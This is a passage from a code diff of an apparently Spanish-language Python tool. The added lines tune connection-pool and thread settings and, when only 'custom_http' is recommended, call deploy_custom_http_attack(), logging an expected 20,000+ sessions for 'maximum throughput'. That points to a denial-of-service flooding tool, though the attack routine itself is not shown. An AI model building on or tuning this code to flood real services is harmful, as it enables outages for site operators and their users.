+                CONNECTION_POOL_SIZE = optimal_params["pool_connections"]
+            if "keep_alive" in optimal_params:
+                KEEP_ALIVE_POOLING = optimal_params["keep_alive"]
+            
+            log_message("INFO", f"✅ [OPTIMIZATION] Parámetros aplicados: MAX_CONNECTIONS={MAX_CONNECTIONS}, MAX_THREADS={MAX_THREADS}, POWER_LEVEL={POWER_LEVEL}, MULTIPLIER={MULTIPLIER}", force_console=True)
+            print_color(f"✅ Parámetros optimizados aplicados para {expected_sessions} sesiones", Colors.GREEN, True)
+        
         # Mapeo de nombres de herramientas a funciones de despliegue
         tool_deployment_map = {
             "custom_http": ("custom_http", None),  # Se despliega después
@@ -12096,6 +12449,20 @@ Ejemplos:
         if not recommended_tools_list:
             log_message("WARN", "⚠️ Ninguna herramienta recomendada disponible - usando fallback", force_console=True)
             recommended_tools_list = [("custom_http", None)]
+        
+        # OPTIMIZACIÓN: Si solo se recomienda una herramienta, usar solo esa para máximo throughput
+        if recommended_count == 1 and recommended_tool_names and recommended_tool_names[0] == "custom_http":
+            log_message("INFO", f"🎯 [OPTIMIZATION] Modo optimizado: Usando SOLO custom_http para máximo throughput (evitando sobrecarga del sistema)", force_console=True)
+            print_color(f"🎯 Modo optimizado: Solo {recommended_tool_names[0]} para máximo throughput", Colors.GREEN, True)
+            # Solo ejecutar custom_http con parámetros optimizados
+            try:
+                deploy_custom_http_attack()
+                tools_deployed = 1
+                log_message("INFO", f"✅ [OPTIMIZATION] Ataque HTTP optimizado desplegado - esperando {expected_sessions if 'expected_sessions' in locals() else '20,000+'} sesiones", force_console=True)
+            except Exception as e:
+                log_message("ERROR", f"❌ [OPTIMIZATION] Error desplegando ataque optimizado: {e}", force_console=True)
+            # Salir temprano - no ejecutar otras herramientas
+            return
         
         # Limitar a la cantidad recomendada (máximo 5)
         max_recommended = min(recommended_count, 5, MAX_TOOLS_DEPLOY)
